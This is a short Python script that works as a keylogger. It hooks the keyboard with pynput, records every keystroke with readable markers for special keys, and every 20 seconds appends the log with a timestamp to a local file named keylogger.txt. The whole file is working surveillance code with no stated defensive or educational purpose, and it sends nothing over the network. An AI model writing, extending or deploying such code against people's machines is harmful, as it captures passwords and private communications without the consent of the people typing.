from pynput.keyboard import Listener
from threading import Timer
from datetime import datetime

msg = ''

def on_press(key):
    global msg
    k = str(key).replace("'", "")
    if k == 'Key.enter':
        msg += " ENTER\n"
    elif k == 'Key.backspace':
        msg += "[backspace]"
    elif k == 'Key.shift':
        msg += '^'
    elif k == 'Key.shift_r':
        msg += '^'
    elif k == 'Key.space':
        msg += ' '
    elif k == 'Key.right':
        msg += ' right '
    elif k == 'Key.left':
        msg += ' left '
    elif k == 'Key.up':
        msg += ' up '
    elif k == 'Key.down':
        msg += ' down '
    else:
        msg += k
    
    

def send():
    global msg
    if len(msg)>0:
        f = open("keylogger.txt", "a")
        f.write("\n~~~~~~~~" + str(datetime.now()) + "~~~~~~~~\n")
        f.write(msg)
        f.close()
        msg = ''
    Timer(20.0, send).start()

listener = Listener(on_press=on_press)
listener.start()
Timer(5.0, send).start()
